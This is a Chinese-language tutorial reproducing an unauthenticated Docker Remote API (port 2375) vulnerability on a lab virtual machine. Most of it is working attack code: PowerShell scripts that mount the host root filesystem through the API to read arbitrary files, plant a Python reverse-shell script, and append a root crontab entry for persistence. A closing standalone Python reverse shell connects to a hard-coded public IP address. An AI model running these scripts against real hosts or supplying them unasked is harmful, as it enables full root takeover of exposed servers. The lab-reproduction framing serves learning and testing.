# Docker remote api未授权访问漏洞(Port=2375)
## 简介
该未授权访问漏洞是因为docker remote api可以执行docker命令，从官方文档可以看出，该接口是目的是取代docker 命令界面，通过url操作docker。
Docker remote Api未授权访问的攻击原理与之前的Redis未授权访问漏洞大同小异，都是通过向运行该应用的服务器写文件，从而拿到服务器的权限。
Docker 默认只监听 Unix Socket（`/var/run/docker.sock`），但若配置不当将 TCP 2375 端口暴露且未启用 TLS 认证，攻击者可直接调用 Docker API 进行容器管理、宿主机文件读写等操作。
docker swarm是docker下的分布化应用的本地集群，在开放2375监听集群容器时，会调用这个api
当某个主机开放了2375端口时，就要注意了！
如果访问`ip:2375/version`就会输出版本信息，就和`docker version`命令效果一样
同样，url为`ip:2375/v1.24/containers/json`会列出容器信息，和`docker ps -a`效果一样。
## 复现环境搭建
环境中已经安装好了docker环境，这边的主要就是去开启2375的端口监听。
打开 Docker Desktop → **Settings → General**，勾选：
```
✅ Expose daemon on tcp://localhost:2375 without TLS
```
点击apply并重启Docker
访问`http://localhost:2375/version`就会出现版本信息。
为了提供更好的隔离性，不用WSL，用kali虚拟机复现。
先在虚拟机安装Docker
```
apt-get update
apt-get install -y docker.io docker-compose
systemctl start docker
docker version
```
配置环境
```
tee /etc/systemd/system/docker.service.d/override.conf <<EOF
[Service]
ExecStart=
ExecStart=/usr/sbin/dockerd -H fd:// -H tcp://0.0.0.0:2375
EOF

systemctl daemon-reload && systemctl restart docker

# 验证是否成功
systemctl status docker
curl http://localhost:2375/version
```
## 复现
刚才配置的虚拟机为靶机，实际操作在我的windows主机。
访问`ip:2375/version`或者`ip:2375/version`可以看到版本消息，验证漏洞存在。
### 读取敏感文件
```bash
$TARGET = "http://192.168.221.130:2375"  # 注意不要有后面的斜杠

Invoke-RestMethod "$TARGET/version" #验证是否正常

# 本地已有 alpine 镜像，直接创建容器
$body = @{
    Image = "alpine"
    Cmd = @("/bin/sh", "-c", "cat /host/flag")
    HostConfig = @{
        Binds = @("/:/host")
    }
} | ConvertTo-Json -Depth 5

$res = Invoke-RestMethod -Method Post `
    -Uri "$TARGET/containers/create" `
    -ContentType "application/json" `
    -Body $body

$id = $res.Id
Write-Host "容器ID: $id"

# 启动容器
Invoke-RestMethod -Method Post "$TARGET/containers/$id/start"
Start-Sleep -Seconds 2

# 获取输出
Invoke-RestMethod "$TARGET/containers/$id/logs?stdout=1&stderr=1"
```
这样就可以读取任意文件了。

### 反弹shell
如果没有ssh就没办法了吗，也是有的，那就是反弹shell。
但是不可以直接用命令反弹，不然反弹得到的只是docker容器的shell，不是靶机的，需要写入crontab反弹Shell。
```bash
$TARGET = "http://192.168.221.130:2375"
$LHOST = "192.168.221.1"
$LPORT = "4444"

# 第一步：写入反弹 shell 脚本到宿主机
$body1 = @{
    Image = "alpine"
    Cmd = @("/bin/sh", "-c", @"
cat > /host/tmp/shell.py << 'PYEOF'
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$LHOST",$LPORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
PYEOF
chmod +x /host/tmp/shell.py
"@)
    HostConfig = @{ Binds = @("/:/host") }
} | ConvertTo-Json -Depth 5

$res1 = Invoke-RestMethod -Method Post `
    -Uri "$TARGET/containers/create" `
    -ContentType "application/json" `
    -Body $body1

Invoke-RestMethod -Method Post "$TARGET/containers/$($res1.Id)/start"
Start-Sleep -Seconds 2

# 第二步：写入 crontab 执行脚本
$body2 = @{
    Image = "alpine"
    Cmd = @("/bin/sh", "-c",
        "echo '* * * * * root python3 /tmp/shell.py' >> /host/etc/crontab")
    HostConfig = @{ Binds = @("/:/host") }
} | ConvertTo-Json -Depth 5

$res2 = Invoke-RestMethod -Method Post `
    -Uri "$TARGET/containers/create" `
    -ContentType "application/json" `
    -Body $body2

Invoke-RestMethod -Method Post "$TARGET/containers/$($res2.Id)/start"
Start-Sleep -Seconds 2

# 第三步：验证脚本和 crontab 内容
$body3 = @{
    Image = "alpine"
    Cmd = @("/bin/sh", "-c", "cat /host/tmp/shell.py && echo '---' && tail -3 /host/etc/crontab")
    HostConfig = @{ Binds = @("/:/host") }
} | ConvertTo-Json -Depth 5

$res3 = Invoke-RestMethod -Method Post `
    -Uri "$TARGET/containers/create" `
    -ContentType "application/json" `
    -Body $body3

Invoke-RestMethod -Method Post "$TARGET/containers/$($res3.Id)/start"
Start-Sleep -Seconds 2
Invoke-RestMethod "$TARGET/containers/$($res3.Id)/logs?stdout=1&stderr=1"
```
开启监听后大概等一分钟。之所以要先把脚本写入一个文件，再在定时任务里执行这个文件是因为防止出现引号解析问题。这样也可以得到root权限。
#### cron 最小执行间隔就是 1 分钟
crontab 的时间格式是：
```
* * * * *
│ │ │ │ │
│ │ │ │ └─ 星期（0-7）
│ │ │ └─── 月份（1-12）
│ │ └───── 日期（1-31）
│ └─────── 小时（0-23）
└───────── 分钟（0-59）
```
`* * * * *` 表示**每分钟执行一次**，这是 `cron` 的最小粒度，所以最多等 1 分钟。

### python反弹shell脚本
```python
import socket,subprocess,os

# 第一步：创建 TCP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 第二步：主动连接攻击机
s.connect(("121.89.81.39", 2333))

# 第三步：重定向标准输入输出
os.dup2(s.fileno(), 0)  # 标准输入  stdin  → socket
os.dup2(s.fileno(), 1)  # 标准输出  stdout → socket
os.dup2(s.fileno(), 2)  # 标准错误  stderr → socket

# 第四步：启动 shell
subprocess.call(["/bin/sh", "-i"])
```
这个脚本只可以在linux上跑，因为`os.dup2` 在 Windows 上不支持，这是 Linux 专用的系统调用。
